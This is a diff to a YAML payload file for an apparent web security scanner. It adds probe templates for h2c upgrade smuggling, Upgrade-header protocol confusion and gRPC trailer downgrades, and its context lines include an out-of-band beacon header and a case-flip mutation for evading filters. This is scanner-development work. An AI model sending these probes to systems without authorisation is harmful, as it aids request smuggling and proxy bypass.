@@ -32,6 +32,18 @@ payloads:
     template: 'X-Argus-Beacon: https://{oast_host}/{canary}'
     confidence: confirmed
     notes: Beacon-header marker; OAST hit confirms the second hop.
+  - id: h2c_connection_tokens
+    template: "Upgrade: h2c\r\nConnection: Upgrade, HTTP2-Settings\r\nHTTP2-Settings: {canary}\r\nX-Argus-Canary: {canary}"
+    confidence: suspected
+    notes: "h2c upgrade variant carrying the full Connection: Upgrade, HTTP2-Settings token set that some edges forward verbatim, confirmed when the origin returns 101 Switching Protocols versus a 200 control."
+  - id: alpn_protocol_confusion
+    template: "Upgrade: h2, h2c, http/1.1\r\nConnection: Upgrade\r\nX-Argus-Canary: {canary}"
+    confidence: suspected
+    notes: "ALPN-style protocol confusion: a multi-token Upgrade list probes whether front-end and back-end select different next-protocols, confirmed by a protocol switch or differential status versus an HTTP/1.1 control."
+  - id: grpc_te_trailers
+    template: "Content-Type: application/grpc+proto\r\nTE: trailers\r\nX-Argus-Canary: {canary}"
+    confidence: suspected
+    notes: "gRPC protocol-downgrade marker pairing a grpc content-type with TE: trailers to probe gRPC-vs-gRPC-Web disagreement, confirmed when the back-end surfaces the canary or a trailer-handling differential versus a control."
 mutations:
   - name: case_flip
     description: HTTP header names are case-insensitive; flips defeat substring filters.
